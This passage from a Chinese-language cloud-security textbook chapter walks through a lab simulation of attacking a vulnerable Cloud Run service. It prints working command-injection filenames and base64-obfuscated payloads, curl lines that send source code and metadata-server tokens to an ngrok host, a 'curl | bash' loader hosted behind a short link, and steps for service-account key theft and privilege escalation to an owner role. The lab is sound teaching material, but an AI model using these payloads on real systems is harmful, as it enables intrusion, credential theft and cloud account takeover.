  \ Note\n\n本节假设你使用攻击者账号来模拟攻击者与 Serverless Lab 账号中的无服务器实验环境资源进行交互。\n\n让我们继续进行模拟：\n\
  \n1. 将输入存储桶的名称存储在 `INPUT_BUCKET` 变量中：\n\n```\nINPUT_BUCKET=\"[INPUT BUCKET]\"\n\
  ```\n\n2. 将 `ngrok` URL 存储在 `NGROK_URL` 变量中：\n\n```\nNGROK_URL=\"https://[ID].ngrok-free.app\"\
  \n```\n\n请务必将 `[ID]` 替换为 `ngrok` 分配的唯一子域名。\n\n3. 构造一个包含命令的恶意文件名，该命令列出文件并将输出发送到 `ngrok`\
  \ URL：\n\n```\nCOMMAND=\"ls -1 . | curl -X POST --data-binary @- $NGROK_URL\"\n\
  FILENAME=\"index.html; $COMMAND #.html\"\necho $FILENAME\n```\n\n这会产生以下输出：\n\n```\n\
  index.html; ls -1 . | curl -X POST --data-binary @- ... #.html\n```\n\n4. 让我们尝试使用构造的文件名创建一个文件：\n\
  \n```\ntouch -- \"$FILENAME\"\n```\n\n这会导致以下错误消息：\n\n```\ntouch: cannot touch '...':\
  \ No such file or directory\n```\n\n5. 将存储在 `COMMAND` 中的 bash 命令转换为 Base64 编码字符串并存储在\
  \ `ENCODED` 变量中：\n\n```\nENCODED=$(echo \"bash -c '$COMMAND'\" | base64 -w0)\necho\
  \ $ENCODED\n```\n\n你应该会得到一个类似以下的编码字符串：\n\n```\nYmFzaCAtYyAnbHMgLTEgLiB8IGN1cmwgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vYWJjZGVmZ2hpai5uZ3Jvay1mcmVlLmFwcCcK\n\
  ```\n\n6. 构造一个包含 Base64 编码的 bash 命令的文件名：\n\n```\nFILENAME=\"index.html; echo $ENCODED\
  \ | base64 -d | bash #.html\"\n```\n\n resulting filename 应类似于以下内容：\n\n```\nindex.html;\
  \ echo YmFzaCAtYyAnbHMgLTEgLiB8IGN1cmwgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vYWJjZGVmZ2hpai5uZ3Jvay1mcmVlLmFwcCcK\
  \ | base64 -d | bash #.html\n```\n\n7. 使用构造的文件名创建一个空文件：\n\n```\ntouch -- \"$FILENAME\"\
  \n```\n\n8. 将文件上传到指定的 Cloud Storage 存储桶：\n\n```\ngsutil cp -- \"$FILENAME\" gs://$INPUT_BUCKET/\n\
  ```\n\n9. 文件上传后几秒钟，你应该能在 Flask 服务器日志中看到受损 Cloud Run 服务应用程序目录中的文件列表：\n\n```\n-------------------------------------------------\n\
  BODY\n-------------------------------------------------\nmain.py\n```\n\n10. 构造并编码一个\
  \ bash 命令，将 `main.py` 的内容发送到指定的 `ngrok` URL：\n\n```\nCOMMAND=\"curl -X POST --data-binary\
  \ @main.py $NGROK_URL\"\nENCODED=$(echo \"bash -c '$COMMAND'\" | base64 -w0)\necho\
  \ $ENCODED\n```\n\n11. 构造一个包含 Base64 编码命令的文件名：\n\n```\nFILENAME=\"index.html; echo\
  \ $ENCODED | base64 -d | bash #.html\"\necho $FILENAME\n```\n\n\n\n\n\n#### 使用构造的文件名创建空文件\n\
  \n```\ntouch -- \"$FILENAME\"\n```\n\n#### 将文件上传到指定的 Cloud Storage 输入存储桶\n\n```\n\
  gsutil cp -- \"$FILENAME\" gs://$INPUT_BUCKET/\n```\n\n文件上传几秒后，你应该能在 Flask 服务器日志中看到被入侵的\
  \ Cloud Run 服务的源代码：\n\n```\nimport os\nimport subprocess\nfrom flask import Flask,\
  \ request\n\n...\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\",\
  \ port=8080)\n```\n\n至此，你已成功完成从易受攻击的 Cloud Run 服务外泄源代码的模拟。从防御角度来看，这凸显了将密钥硬编码在应用程序代码中的风险，如果无服务器计算资源被入侵，这些密钥可能会被暴露。\n\
  \n### 从 Cloud Run 服务外泄服务账号凭据\n\n在本节中，你将模拟攻击者通过代码注入攻击从易受攻击的 Cloud Run 服务外泄服务账号凭据。如前所述，而不是建立反向\
  \ shell，文件名包含一个恶意负载，该负载将与被入侵的 Cloud Run 服务关联的服务账号凭据通过 `curl` 转发到 `ngrok` 隧道。\n\n\
  让我们继续进行模拟：\n\n##### 1. 将 `ngrok` URL 存储在 `NGROK_URL` 变量中\n\n```\nNGROK_URL=\"https://[ID].ngrok-free.app\"\
  \n```\n\n确保用 `ngrok` 分配的唯一子域替换 `[ID]`。如果 `NGROK_URL` 变量已设置，可以跳过此步骤。\n\n##### 2.\
  \ 构造元数据令牌端点 URL 并将其存储在 `TOKEN_URL` 变量中\n\n```\nMETA_HOST=\"http://169.254.169.254\"\
  \nMETA_PATH=\"/computeMetadata/v1/instance/service-accounts/default\"\nTOKEN_EP=\"\
  token\"\n\nTOKEN_URL=\"${META_HOST}${META_PATH}/${TOKEN_EP}\"\n```\n\n##### 3. 生成获取令牌并将其发送到你的\
  \ `ngrok` URL 的命令的 Base64 编码版本\n\n```\nENCODED=$(echo \"bash -c 'curl -s -H \\\"\
  Metadata-Flavor: Google\\\" $TOKEN_URL \\\n  | curl -X POST --data-binary @- $NGROK_URL'\"\
  \ | base64 -w0)\n```\n\n##### 4. 创建一个包含恶意命令注入负载的文件名的新文件\n\n```\nFILENAME=\"index.html;\
  \ echo $ENCODED | base64 -d | bash #.html\"\ntouch -- \"$FILENAME\"\n```\n\n由于存储在\
  \ `$FILENAME` 中的文件名的长度超过了 ext4 文件系统对单个文件名强制执行的 255 字节限制，命令将失败并出现 `File name too\
  \ long` 错误：\n\n```\ntouch: cannot touch 'index.html; echo ... | base64 -d | bash\
  \ #.html': File name too long\n```\n\n此 255 字节限制大致相当于 255 个字符的限制（使用单字节字符时）。由于存储在\
  \ `$FILENAME` 中的值包含 Base64 编码的负载，该负载完全由单字节 ASCII 字符组成，因此总字符数有效地等于总字节数。这意味着如果存储在\
  \ `$FILENAME` 中的完整字符串超过 255 个字符，它也将超过 255 字节的文件系统限制。\n\n##### 5. 打开一个新浏览器标签页并导航到\
  \ [*https://github.com*](https://github.com)。\n\n##### 6. 在打开 GitHub 页面的浏览器标签页上，点击“Sign\
  \ in”并登录你的 GitHub 账号。如果没有账号，[你可以免费创建一个](https://oreil.ly/m8DUg)。你需要一个 GitHub 账号来在接下来的步骤中创建\
  \ gist。\n\n点击右上角的 + 图标并从下拉菜单中选择“New gist” (Figure 10-2)。\n\n![](img/lsse_1002.png)\n\
  \n你将被重定向到可以创建新 gist 的页面。在这里，你可以输入脚本的代码，指定文件名，并可选地添加描述。\n\n在“Create a new Gist”页面上的文本区域中输入以下脚本：\n\
  \n```\n#!/bin/bash\n\nNGROK_URL=\"https://[ID].ngrok-free.app\"\n\nMETA_HOST=\"\
  http://169.254.169.254\"\nMETA_PATH=\"/computeMetadata/v1/instance/service-accounts/default\"\
  \nTOKEN_EP=\"token\"\n\nTOKEN_URL=\"${META_HOST}${META_PATH}/${TOKEN_EP}\"\n\ncurl\
  \ -s -H \"Metadata-Flavor: Google\" $TOKEN_URL \\\n  | curl -X POST --data-binary\
  \ @- $NGROK_URL\n```\n\n执行此脚本时，它会通过内部元数据端点从实例元数据服务器检索 Google Cloud 访问令牌。然后脚本将令牌发送到通过\
  \ `ngrok` 隧道公开的公共 URL。\n\n#### Note\n\n确保在点击“Create secret gist”之前用 `ngrok` 分配的唯一子域替换\
  \ `[ID]`，该子域将流量转发到本地服务器的 8000 端口。\n\n使用 `send.sh` 作为文件名，输入到“Filename including extension…”字段中。\n\
  \n点击“Create secret gist”以保存脚本以便在动手步骤中稍后使用。\n\n右键点击 Raw 按钮并从上下文菜单中选择“Copy link address”。\n\
  \n将原始 gist URL 存储在本地文本文件中，以便在下一组步骤中快速检索它。\n\n##### 7. 启动一个新浏览器标签页并导航到原始 gist URL，以验证它是否显示纯代码而没有任何\
  \ HTML 格式或 GitHub 界面元素。\n\n##### 8. 打开一个新浏览器标签页并导航到 [*https://tinyurl.com*](https://tinyurl.com)。\n\
  \n#### Note\n\nTinyURL 让你可以将长链接转换为短链接，其字符数明显少于原始链接。在幕后，TinyURL 缩短链接会自动重定向到你输入的原始链接。或者，你也可以使用\
  \ Bitly 或其他 URL 缩短服务。\n\n##### 9. 在 TinyURL 主页上，找到 URL 缩短表单。\n\n#### Note\n\n在完成本章的手动示例时，你无需登录或创建账号即可使用\
  \ TinyURL 上的 URL 缩短功能。\n\n在“Enter long link here”字段中，指定指向原始 secret GitHub gist 的\
  \ URL：\n\n```\nhttps://gist.githubusercontent.com/[YOUR GITHUB USERNAME]/[GIST ID]/raw/[SPECIFIC\
  \ VERSION]/send.sh\n```\n\n在“Enter alias”字段中输入自定义别名。\n\n#### Tip\n\n你可以使用生成的 `ngrok`\
  \ 子域（例如 `https://[GENERATED-ID].ngrok-free.app`）作为别名，以便更轻松地记住命令、脚本或负载中的 URL。\n\n\
  点击“Verify that you are human”复选框以完成验证步骤。\n\n点击 Shorten URL 生成缩短的 URL。然后将缩短的 URL\
  \ 复制到本地文本文件中，以便在下一组步骤中快速引用和使用。\n\n##### 10. 切回打开 Google Cloud 控制台（攻击者账号）的浏览器标签页。\n\
  \n##### 11. 在 Cloud Shell 终端中（在 `$` 符号之后）运行以下命令，将生成的缩短 URL 存储在名为 `SHORT_URL` 的变量中\n\
  \n```\nSHORT_URL=\"https://tinyurl.com/[ALIAS]\"\n```\n\n确保在运行命令之前用你的自定义 TinyURL\
  \ 别名替换 `[ALIAS]`。如果指定的 TinyURL 别名为 `abcdef`，则 `SHORT_URL` 的值为：`\"https://tinyurl.com/abcdef\"\
  `。\n\n##### 12. 从存储在 `SHORT_URL` 中的缩短 URL 准备 Base64 编码的负载\n\n```\nRAW_COMMAND=\"\
  curl -sL $SHORT_URL | bash\"\nENCODED=$(echo \"$RAW_COMMAND\" | base64 -w0)\n```\n\
  \n你可以在使用之前运行 `echo $ENCODED` 来查看 Base64 编码的负载。\n\n##### 13. 创建一个包含恶意命令注入负载的文件名的新文件\n\
  \n```\nFILENAME=\"index.html; echo $ENCODED | base64 -d | bash #.html\"\ntouch --\
  \ \"$FILENAME\"\n```\n\n\n\n\n\n`--` 告诉 `touch` 命令停止将后续参数解释为选项，即使它们以连字符 (`-`) 开头。当你的文件名包含特殊字符，例如分号或连字符时，这很有用，这些字符可能会使命令混淆或触发意外行为。\n\
  \n#### Caution\n\n如果你停止并重新启动你的 `ngrok` 隧道，下次启动时生成的子域名将会改变。这意味着你必须使用新的子域名更新 gist\
  \ 脚本，使用 TinyURL 创建一个新的缩短 URL，并重复所有之前的步骤——包括生成编码后的有效载荷并使用恶意文件名创建新文件。\n\n14. 指定文件将被上传到的\
  \ Cloud Storage 存储桶：\n\n```\nINPUT_BUCKET=\"[SPECIFY CLOUD STORAGE BUCKET]\"\n```\n\
  \n确保 `INPUT_BUCKET` 的值与配置了事件触发器的 Cloud Storage 存储桶的实际名称完全匹配。当有新文件上传时，该存储桶将调用 Cloud\
  \ Run 服务。^(11)\n\n15. 将文件上传到指定的 Cloud Storage 存储桶：^(12)\n\n```\ngsutil cp -- \"\
  $FILENAME\" gs://$INPUT_BUCKET/\n```\n\n这会产生以下输出：\n\n```\nCopying file://index.html;\
  \ echo ... | base64 -d | bash #.html\n[Content-Type=text/html]...\n- [1 files][\
  \   21.0 B/   21.0 B]\nOperation completed over 1 objects/21.0 B.\n```\n\n#### Caution\n\
  \n在执行 `gsutil` 命令之前，请确保请求接收器 Flask 服务器和 `ngrok` 隧道都在运行。\n\n16. 文件上传后几秒钟，你应该会在本地机器的终端中看到包含\
  \ Cloud Run 服务使用的服务账号访问令牌的 JSON 对象：\n\n```\n{\"access_token\":\"...\",\"expires_in\"\
  :741,\"token_type\":\"Bearer\"}\n```\n\n17. 从此 JSON 对象中复制 `access_token` 的值。\n\n\
  18. 在攻击者账号的 CloudShell 终端中，将访问令牌存储在变量中：\n\n```\nACCESS_TOKEN=\"[ACCESS TOKEN]\"\n\
  ```\n\n确保将 `[ACCESS TOKEN]` 替换为实际的访问令牌值。\n\n运行以下命令列出可通过访问令牌访问的所有项目：\n\n```\ncurl\
  \ -H \"Authorization: Bearer $ACCESS_TOKEN\" \\\n    https://cloudresourcemanager.googleapis.com/v1/projects\n\
  ```\n\n这会给出以下 JSON 输出：\n\n```\n{\n  \"projects\": [\n    {\n      \"projectNumber\"\
  : \"...\",\n      \"projectId\": \"...\",\n      \"lifecycleState\": \"ACTIVE\"\
  ,\n      \"name\": \"...\",\n      \"createTime\": \"...\"\n    }\n  ]\n}\n```\n\
  \n请注意 JSON 响应中的项目编号值，因为它将在下一步中使用。^(13)\n\n19. 从上一步复制项目 ID 和项目编号，并分别存储在 `PROJECT_ID`\
  \ 和 `PROJECT_NUMBER` 变量中：\n\n```\nPROJECT_ID=\"[PROJECT ID]\"\nPROJECT_NUMBER=\"\
  [PROJECT NUMBER]\"\n```\n\n在执行命令之前，请确保将 `[PROJECT ID]` 和 `[PROJECT NUMBER]` 替换为其实际值。\n\
  \n20. 列出该项目的 Cloud Storage 存储桶：^(14)\n\n```\ncurl -s -H \"Authorization: Bearer\
  \ $ACCESS_TOKEN\" \\\n    \"https://storage.googleapis.com/storage/v1/b?project=$PROJECT_NUMBER\"\
  \n```\n\n你应该得到以下 JSON 响应：\n\n```\n{\n  \"kind\": \"storage#buckets\",\n  \"items\"\
  : [\n    ...\n    {\n      \"kind\": \"storage#bucket\",\n      \"selfLink\": \"\
  ...\",\n      \"id\": \"ss-another-bucket-...\",\n      \"name\": \"ss-another-bucket-...\"\
  ,\n      \"projectNumber\": \"...\",\n      \"generation\": \"...\",\n\n      ...\n\
  \    }\n    ...\n  ]\n}\n```\n\n21. 通过查询令牌信息端点来验证访问令牌的详细信息：\n\n```\ncurl -s \"https://oauth2.googleapis.com/tokeninfo?access_token=$ACCESS_TOKEN\"\
  \n```\n\n这会返回类似以下的 JSON 输出：\n\n```\n{\n  \"azp\": \"...\",\n  \"aud\": \"...\",\n\
  \  \"scope\": \"https://www.googleapis.com/auth/youtube ...\",\n  \"exp\": \"...\"\
  ,\n  \"expires_in\": \"732\",\n  \"email\": \"html-to-pdf@....iam.gserviceaccount.com\"\
  ,\n  \"email_verified\": \"true\",\n  \"access_type\": \"online\"\n}\n```\n\n22.\
  \ 从上一步复制服务账号电子邮件地址并将其存储在 `SA_EMAIL` 变量中：^(15)\n\n```\nSA_EMAIL=\"[EMAIL ADDRESS]\"\
  \n```\n\n23. 生成新的服务账号密钥然后将其保存到本地：^(16)\n\n```\ncd ~\n\nBASE_URL=\"https://iam.googleapis.com/v1\"\
  \nPROJECT_PATH=\"projects/$PROJECT_ID\"\nSERVICE_ACCOUNT=\"serviceAccounts/$SA_EMAIL\"\
  \n\ncurl -s -X POST \\\n  -H \"Authorization: Bearer $ACCESS_TOKEN\" \\\n  -H \"\
  Content-Type: application/json\" \\\n  \"$BASE_URL/$PROJECT_PATH/$SERVICE_ACCOUNT/keys\"\
  \ \\\n  -d '{}' \\\n  | jq -r '.privateKeyData' | base64 --decode > run-key.json\n\
  ```\n\n24. 检查 `run-key.json` 文件的内容：\n\n```\ncat run-key.json\n```\n\n这会产生以下输出：\n\
  \n```\n{\n  \"type\": \"service_account\",\n  \"project_id\": \"...\",\n  \"private_key_id\"\
  : \"...\",\n  \"private_key\": \"...\",\n  \"client_email\": \"html-to-pdf@....iam.gserviceaccount.com\"\
  ,\n  \"client_id\": \"...\",\n  \"auth_uri\": \"https://accounts.google.com/o/oauth2/auth\"\
  ,\n  \"token_uri\": \"https://oauth2.googleapis.com/token\",\n  \"auth_provider_x509_cert_url\"\
  : \"https://www.googleapis.com/...\",\n  \"client_x509_cert_url\": \"https://www.googleapis.com/...\"\
  ,\n  \"universe_domain\": \"googleapis.com\"\n}\n```\n\n25. 使用 `run-key.json` 文件以受损\
  \ Cloud Run 服务使用的服务账号身份进行身份验证：\n\n```\nexport RUN_KEY_CREDENTIALS=\"run-key.json\"\
  \ngcloud auth activate-service-account \\\n  --key-file=$RUN_KEY_CREDENTIALS\n```\n\
  \n这会产生以下输出：\n\n```\nActivated service account credentials for:\n [html-to-pdf@....iam.gserviceaccount.com]\n\
  ```\n\n26. 将当前的 `gcloud` 项目设置为 `run-key.json` 中指定的项目：\n\n```\nPROJECT_ID=$(cat run-key.json\
  \ | jq -r \".project_id\")\ngcloud config set project $PROJECT_ID\n```\n\n你应该得到以下确认消息：\n\
  \n```\nUpdated property [core/project].\n```\n\n27. 列出当前 Google Cloud 项目中的所有服务账号：\n\
  \n```\ngcloud iam service-accounts list\n```\n\n这会给出一个服务账号列表——包括一个电子邮件地址以 `superadmin`\
  \ 开头的服务账号：\n\n```\n...\n\nDISPLAY NAME: Cloud Run HTML to PDF Service Account\n\
  EMAIL: html-to-pdf@....iam.gserviceaccount.com\nDISABLED: False\n\nDISPLAY NAME:\
  \ superadmin\nEMAIL: superadmin@....iam.gserviceaccount.com\nDISABLED: False\n\n\
  ...\n```\n\n28. 复制以 `superadmin` 开头的服务账号的电子邮件地址并将其存储在 `EMAIL` 变量中：\n\n```\nEMAIL=\"\
  [EMAIL ADDRESS]\"\n```\n\n29. 检查电子邮件地址以 `superadmin` 开头的服务账号分配的 IAM 角色：\n\n```\n\
  gcloud projects get-iam-policy $PROJECT_ID \\\n  --flatten=\"bindings[].members\"\
  \ \\\n  --format='table(bindings.role)' \\\n  --filter=\"bindings.members:$EMAIL\"\
  \n```\n\n这会返回以下响应：\n\n```\nROLE: roles/owner\n```\n\n30. 尝试冒充与 `roles/owner` 角色关联的服务账号：\n\
  \n```\ngcloud iam service-accounts keys create ~/superadmin-key.json \\\n  --iam-account=$EMAIL\
  \ \\\n  --impersonate-service-account=$EMAIL\n```\n\n这会产生以下错误消息：\n\n\n\n\n\n```\n\
  WARNING: This command is using service account impersonation. All API calls will\
  \ be executed as [superadmin@....iam.gserviceaccount.com].\nERROR: (gcloud.iam.service-accounts.keys.create)\
  \ PERMISSION_DENIED: Failed to impersonate [superadmin@....iam.gserviceaccount.com].\
  \ Make sure the account that's trying to impersonate it has access to the service\
  \ account itself and the \"roles/iam.serviceAccountTokenCreator\" role. Permission\
  \ 'iam.serviceAccounts.getAccessToken' denied on resource (or it may not exist).\
  \ This command is authenticated as html-to-pdf@....iam.gserviceaccount.com which\
  \ is the active account specified by the [core/account] property. Impersonation\
  \ is used to impersonate superadmin@....iam.gserviceaccount.com.\n- '@type': type.googleapis.com/google.rpc.ErrorInfo\n\
  \  domain: iam.googleapis.com\n  metadata:\n    permission: iam.serviceAccounts.getAccessToken\n\
  \  reason: IAM_PERMISSION_DENIED\n```\n\n在此阶段，你已成功完成从受损的 Cloud Run 服务中窃取服务账号凭据的模拟。使用这些凭据后，你以服务账号身份进行了身份验证（`html-to-pdf@…​.iam.gservice​ac⁠count.com`），并检查是否可以直接冒充具有提升权限的其他服务账号（例如\
  \ `superadmin@…​.iam.gserviceaccount.com`），而无需所需的权限。正如你在以下各节中将看到的那样，在满足某些条件后，攻击者可以通过各种技术和方法提升权限。我们将在本章中介绍其中几种。\n\
  \n### 通过 Cloud Run 函数提升权限\n\n在云环境中，如果满足某些条件，例如存在授予过度权限的 IAM 角色配置错误或暴露具有特定权限集的服务账号凭据，攻击者可以提升权限。攻击者可以使用众多技术成功提升权限，从启动新的计算或无服务器资源到利用身份和访问配置错误。\n\
  \n在本节中，你将探索攻击者如何通过启动新的 Cloud Run 函数并将其与具有更高权限的服务账号关联来进行权限提升。通过此新的 Cloud Run 函数，攻击者可以为具有提升权限的服务账号获取访问令牌，然后使用它以该服务账号身份进行身份验证。一旦以具有更高权限的服务账号身份进行身份验证，攻击者就可以以与服务账号的\
  \ IAM 角色分配允许的相同访问级别进行操作。\n\n如 Figure 10-3 所示，本节中你将执行的模拟从使用受损的 `html-to-pdf@…​.iam.gserviceaccount.com`\
  \ 服务账号部署新的 Cloud Run 函数并将其与 `superadmin@…​.iam.gserviceaccount.com` 服务账号关联开始。然后你将从已部署的函数资源中获取访问令牌，并使用它为\
  \ `superadmin@…​.iam.gserviceaccount.com` 生成服务账号密钥以进行身份验证。\n\n![](img/lsse_1003.png)\n\
  \n#### Note\n\n本节假设你正在使用攻击者账号，即你一直在用来模拟攻击者对托管在 Serverless Lab 账号中的无服务器实验室环境执行操作的账号。\n\
  \n让我们继续进行权限提升模拟：\n\n1. 导航到 Cloud Shell 环境的主目录，然后打印 `run-key.json` 文件中的 JSON 值：\n\
  \n```\ncd ~\n    \ncat run-key.json\n```\n\n这会产生以下输出：\n\n```\n{\n  \"type\": \"\
  service_account\",\n  \"project_id\": \"...\",\n  \"private_key_id\": \"...\",\n\
  \  \"private_key\": \"...\",\n  \"client_email\": \"html-to-pdf@....iam.gserviceaccount.com\"\
  ,\n  \"client_id\": \"...\",\n  \"auth_uri\": \"https://accounts.google.com/o/oauth2/auth\"\
  ,\n  \"token_uri\": \"https://oauth2.googleapis.com/token\",\n  \"auth_provider_x509_cert_url\"\
  : \"https://www.googleapis.com/...\",\n  \"client_x509_cert_url\": \"https://www.googleapis.com/...\"\
  ,\n  \"universe_domain\": \"googleapis.com\"\n}\n```\n\n`run-key.json` 文件包含 `html-to-pdf@…​.iam.gserviceaccount.com`\
  \ 服务账号的私钥和相关凭据。\n\n2. 使用 `run-key.json` 文件以受损 Cloud Run 服务使用的服务账号身份进行身份验证：\n\n```\n\
  export RUN_SA_CREDENTIALS=\"run-key.json\"\ngcloud auth activate-service-account\
  \ \\\n  --key-file=$RUN_SA_CREDENTIALS\n```\n\n你应该收到以下确认消息：\n\n```\nActivated service\
  \ account credentials for:\n [html-to-pdf@....iam.gserviceaccount.com]\n```\n\n\
  3. 通过从密钥文件检索项目 ID 来设置当前 `gcloud` 项目：\n\n```\nPROJECT_ID=$(cat run-key.json | jq\
  \ -r \".project_id\")\ngcloud config set project $PROJECT_ID\n```\n\n4. 从密钥文件检索服务账号的电子邮件地址并将其存储在\
  \ `RUN_KEY_EMAIL` 变量中：\n\n```\nRUN_KEY_EMAIL=$(cat run-key.json | jq -r \".client_email\"\
  )\necho $RUN_KEY_EMAIL\n```\n\n你应该得到以下输出：\n\n```\nhtml-to-pdf@....iam.gserviceaccount.com\n\
  ```\n\n5. 检查分配给服务账号的 IAM 角色以验证其权限：\n\n```\ngcloud projects get-iam-policy $PROJECT_ID\
  \ \\\n  --flatten=\"bindings[].members\" \\\n  --format='table(bindings.role)' \\\
  \n  --filter=\"bindings.members:$RUN_KEY_EMAIL\"\n```\n\n这会产生以下输出：\n\n```\nROLE:\
  \ roles/editor\n\nROLE: roles/iam.serviceAccountUser\n\nROLE: roles/run.admin\n\
  ```\n\n#### Caution\n\n尽管没有直接冒充其他服务账号的能力，但 `roles/run.admin` 和 `roles/iam.serviceAccountUser`\
  \ 角色的组合可以被攻击者利用来启动新的 Cloud Run 函数并将其与具有提升权限的现有服务账号关联。单独使用，`roles/run.admin` 仅允许管理\
  \ Cloud Run 资源，但如果没有 `roles/iam.serviceAccountUser`，则无法将服务账号附加到 Cloud Run 函数。\n\n\
  6. 列出当前 Google Cloud 项目中的所有服务账号：\n\n```\ngcloud iam service-accounts list\n```\n\
  \n这会给出一个服务账号列表——包括一个电子邮件地址以 `superadmin` 开头的服务账号：\n\n```\n...\n\nDISPLAY NAME: Cloud\
  \ Run HTML to PDF Service Account\nEMAIL: html-to-pdf@....iam.gserviceaccount.com\n\
  DISABLED: False\n\nDISPLAY NAME: superadmin\nEMAIL: superadmin@....iam.gserviceaccount.com\n\
  DISABLED: False\n```\n\n从显示名称（例如 `superadmin`）中，攻击者通常可以识别出哪些服务账号可能具有提升的权限，并利用它们来提升权限。\n\
  \n7. 复制以 `superadmin` 开头的服务账号的电子邮件地址并将其存储在 `SA_EMAIL` 变量中：\n\n```\nSA_EMAIL=\"[EMAIL\
  \ ADDRESS]\"\n```\n\n8. 检查电子邮件地址以 `superadmin` 开头的服务账号分配的 IAM 角色：\n\n```\ngcloud\
  \ projects get-iam-policy $PROJECT_ID \\\n  --flatten=\"bindings[].members\" \\\n\
  \  --format='table(bindings.role)' \\\n  --filter=\"bindings.members:$SA_EMAIL\"\
  \n```\n\n这会返回以下响应：\n\n```\nROLE: roles/owner\n```\n\n此时，你已确定用于提升权限的服务账号。让我们继续通过设置一些先决条件并启动一个新的\
  \ Cloud Run 函数来检索与服务关联的服务账号的令牌：\n\n1. 创建一个新目录，然后使用 `touch` 命令在目录内为 Cloud Run 函数的配置和代码创建初始空项目文件：\n\
  \n\n\n\n```bash\nmkdir -p token-provider\ncd token-provider\n\ntouch index.js\n\
  touch package.json\n```\n\n2. 点击 `Open Editor` 打开 Cloud Shell 编辑器，在此定义 Node.js 依赖项并指定应用程序代码。如果看不到\
  \ `token-provider` 目录，请点击刷新资源管理器按钮。\n\n3. 在 Cloud Shell 编辑器中，使用以下代码更新 `index.js`\
  \ 文件：\n\n```javascript\nexports.mainHandler = async (req, res) => {\n  res.status(200).send({\n\
  \    message: `It works!`\n  });\n};\n```\n\n打开并使用以下配置更新 `package.json` 文件：\n\n\
  ```json\n{\n  \"name\": \"secure-function\",\n  \"version\": \"1.0.0\",\n  \"main\"\
  : \"index.js\"\n}\n```\n\n点击 `Open Terminal` 切换回 CLI，在此可以运行命令。\n\n4. 设置后续部署命令中使用的函数名称：\n\
  \n```bash\nFUNCTION_NAME=\"token-provider\"\n```\n\n5. 使用具有 `roles/owner` 角色的服务账号\
  \ (`superadmin@…​.iam.gserviceaccount.com`) 部署 Cloud 函数：\n\n```bash\nREGION=\"us-east1\"\
  \n\ngcloud functions deploy $FUNCTION_NAME \\\n  --gen2 \\\n  --runtime=nodejs20\
  \ \\\n  --region=$REGION \\\n  --source=. \\\n  --entry-point=mainHandler \\\n \
  \ --service-account=$SA_EMAIL \\\n  --trigger-http \\\n  --no-allow-unauthenticated\n\
  ```\n\n这会产生以下输出：\n\n```\nPreparing function...done.\n...\nCompleted with warnings:\n\
  \  [WARNING] *** Improve build performance by generating\n  and committing package-lock.json.\n\
  You can view your function in the Cloud Console here: ...\n\n...\n\nurl: https://....cloudfunctions.net/token-provider\n\
  ```\n\n#### Caution\n\n请确保不要意外地向此 Cloud Run 函数授予未经身份验证的访问权限，因为服务账号已配置了 `roles/owner`\
  \ 角色。\n\n6. 获取已部署 Cloud 函数的 HTTPS 端点：\n\n```bash\nFUNCTION_URL=$(gcloud functions\
  \ describe $FUNCTION_NAME \\\n  --region=us-east1 \\\n  --gen2 \\\n  --format=\"\
  value(serviceConfig.uri)\")\n\necho $FUNCTION_URL\n```\n\n你应该得到以下输出：\n\n```\nhttps://token-provider-....a.run.app\n\
  ```\n\n7. 向 Cloud Run 函数发出授权请求：\n\n```bash\nTOKEN=$(gcloud auth print-identity-token)\n\
  \ncurl -H \"Authorization: Bearer $TOKEN\" $FUNCTION_URL\n```\n\n这会产生以下 JSON 响应：\n\
  \n```\n{\"message\":\"It works!\"}\n```\n\n8. 现在你有一个可用的 Cloud Run 函数，是时候修改应用程序代码以检索函数使用的服务账号的访问令牌了。点击\
  \ `Open Editor` 并打开 `index.js` 文件。\n\n9. 在 Cloud Shell 编辑器中，更新 `index.js` 文件以从元数据服务器检索服务账号的访问令牌：\n\
  \n```javascript\nconst {execSync} = require('child_process');\n\nconst META_HOST\
  \ = \"http://metadata.google.internal\";\nconst META_PATH = \"/computeMetadata/v1/instance\"\
  ;\nconst SA_PATH   = \"/service-accounts/default\";\nconst TOKEN_EP  = \"/token\"\
  ;\n\nconst FULL_URL = `${META_HOST}${META_PATH}${SA_PATH}${TOKEN_EP}`;\n\nexports.mainHandler\
  \ = async (req, res) => {\n  try {\n    const token = execSync(\n      `curl -s\
  \ -H \"Metadata-Flavor: Google\" \"${FULL_URL}\"`\n    ).toString();\n\n    res.setHeader('Content-Type',\
  \ 'application/json');\n    res.status(200).send(token);\n  } catch (err) {\n  \
  \  console.error(err);\n    res.status(500).send(err.message);\n  }\n};\n```\n\n\
  点击 `Open Terminal`。\n\n10. 部署 Cloud Run 函数的最新代码更改：\n\n```bash\ngcloud functions\
  \ deploy $FUNCTION_NAME \\\n  --gen2 \\\n  --runtime=nodejs20 \\\n  --region=$REGION\
  \ \\\n  --source=. \\\n  --entry-point=mainHandler \\\n  --service-account=$SA_EMAIL\
  \ \\\n  --trigger-http \\\n  --no-allow-unauthenticated\n```\n\n几分钟后，你应该会看到以下日志消息：\n\
  \n```\nPreparing function...done.\n...\nCompleted with warnings:\n  [WARNING] ***\
  \ Improve build performance by generating\n  and committing package-lock.json.\n\
  \  [INFO] A new revision will be deployed serving with 100% traffic.\nYou can view\
  \ your function in the Cloud Console here: ...\n\n...\n\nurl: https://....cloudfunctions.net/token-provider\n\
  ```\n\n11. 向 Cloud Run 函数发出授权请求：\n\n```bash\nTOKEN=$(gcloud auth print-identity-token)\n\
  \nOUTPUT=$(curl -H \"Authorization: Bearer $TOKEN\" $FUNCTION_URL)\n\necho $OUTPUT\n\
  ```\n\n这会产生以下 JSON 响应：\n\n```\n{\"access_token\":\"...\",\"expires_in\":...,\"token_type\"\
  :\"Bearer\"}\n```\n\n此从 Cloud Run 函数获取的访问令牌允许攻击者以关联的服务账号 (`superadmin@…​.iam.gservice​ac⁠count.com`)\
  \ 身份进行身份验证。攻击者可以执行服务账号的 IAM 角色允许的任何操作。由于 `superadmin@…​.iam.gserviceaccount.com`\
  \ 服务账号已被授予 `roles/owner` 角色，攻击者实际上获得了对项目的完全管理访问权限。\n\n12. 将访问令牌存储在变量 (`SUPERADMIN_ACCESS_TOKEN`)\
  \ 中：\n\n```bash\nSUPERADMIN_ACCESS_TOKEN=$(echo \"$OUTPUT\" | jq -r '.access_token')\n\
